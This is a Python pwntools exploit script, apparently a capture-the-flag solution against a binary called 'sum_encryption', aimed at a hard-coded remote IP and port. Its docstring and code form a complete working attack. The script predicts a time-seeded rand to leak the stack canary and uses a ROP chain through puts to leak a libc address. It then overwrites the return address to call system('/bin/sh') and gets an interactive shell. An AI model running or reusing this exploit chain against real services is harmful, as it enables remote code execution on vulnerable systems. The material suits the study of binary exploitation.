from pwn import *
import sys
import time
from math import floor
from ctypes import CDLL

"""
We have a buffer of size 17, followed by the canary, rbp and ret values.
Thus, the layout is BUF (17 x 0x8) | CANARY | RBP | RET

The encryption scheme is enc = (sum ^ rand).
If we provide all 0 values for the buffer, the sum = 0 and enc = rand
But we can provide 18 as length (17 for buffer + 1 for canary), so the sum
will also account for the canary value.
Again, we provide only 0's as buffer values, and we obtain
enc = ((0 + 0 + ... + 0){17} + canary) ^ rand = canary ^ rand

Also, we generate our rand values using the same seed as the binary (current time),
so we know the value of rand.
Therefore, leaking canary ^ rand, and knowing rand, will get us the canary value:
canary = canary ^ rand ^ rand.

We now have to leak the puts address from libc, using puts_plt(puts_got), jump back to main,
compute system and /bin/sh addresses from leaked value and then provide a payload
that does system(/bin/sh).

Since we're on x64, we need a pop rdi; ret gadget to put the first arg correctly.
"""

upk = lambda x : unpack(x, 'all', endian='little', sign=False)

def get_rand():
    x = libc_wrapper.rand()
    return int(libc_wrapper.rand() << 32 | x)

context.terminal = ['urxvt', '-e', 'sh', '-c']

exec_file = "./sum_encryption"
libc_file = "./libc.so.6"
context.binary = exec_file

e = ELF(exec_file)
libc = ELF(libc_file)
libc_wrapper = CDLL(libc_file)
libc_wrapper.srand(int(floor(time.time())))

# io = process(exec_file)
io = remote("141.85.224.103", 31337)

# layout: BUF (17 x 0x8) | CANARY | RBP | RET
# enc_sum <- canary ^ rand
# num of values (17 + 1 for canary)

data_size       = 8
buf_len         = 17
ret_offset      = 0x90 + 0x8
canary_offset   = 0x90 - 0x8

# buffer has 17 elems (17 x 8 = 0x88)
assert canary_offset / data_size == buf_len

main_addr = 0x4008e1
pop_rdi_ret = 0x400a73
puts_plt = e.symbols['puts']
puts_got = e.symbols['got.puts']
log.info("puts_got: 0x{:016x}".format(puts_got))
log.info("puts_plt: 0x{:016x}".format(puts_plt))


# 1) leak canary
# prompt
io.recvline()
io.recvline()
# num of values
io.sendline(str(buf_len + 1)) # + 1 for canary
# values
io.recvline()
for _ in range(buf_len):
    io.sendline("0")
io.sendline("a") # break scanf while
enc = io.recvline()

canary_xor_rand = int(enc.split()[4])
rand            = get_rand()
canary          = canary_xor_rand ^ rand

log.info("canary ^ rand = %s" % (hex(canary_xor_rand)))
log.info("rand = %s" % (hex(rand)))
log.info("canary = %s" % (hex(canary)))
# ----------


# 2) leak puts address from libc and jump to main
io.recvline()
# num of values
io.sendline("1")
# values
io.recvline()
for _ in range(buf_len):
    io.sendline("0")
io.sendline(str(canary))
io.sendline("1" * 8) # rbp
# ret
io.sendline(str(pop_rdi_ret))
io.sendline(str(puts_got))
io.sendline(str(puts_plt))
io.sendline(str(main_addr))
# --
io.sendline("a") # break scanf while
io.sendline("0") # break main while
# ----------


# 2') compute system and /bin/sh addresses
# prompt
io.recvline()
io.recvline()
# leak
puts_address = upk(io.recvline()[:-1])

puts_offset = libc.symbols['puts']
system_offset = libc.symbols['system']
bin_sh_offset = next(libc.search("/bin/sh\x00"))
libc_start_address = puts_address - puts_offset
system_address = libc_start_address + system_offset
bin_sh_address = libc_start_address + bin_sh_offset
# ----------


# 3) call system(/bin/sh)
io.recvline()
io.recvline()
# num of values
io.sendline("1")
# values
io.recvline()
for _ in range(buf_len):
    io.sendline("0")
io.sendline(str(canary))
io.sendline("1" * 8) # rbp
# ret
io.sendline(str(pop_rdi_ret))
io.sendline(str(bin_sh_address))
io.sendline(str(system_address))
# --
io.sendline("a") # break scanf while
io.sendline("0") # break main while
# ----------

io.interactive()
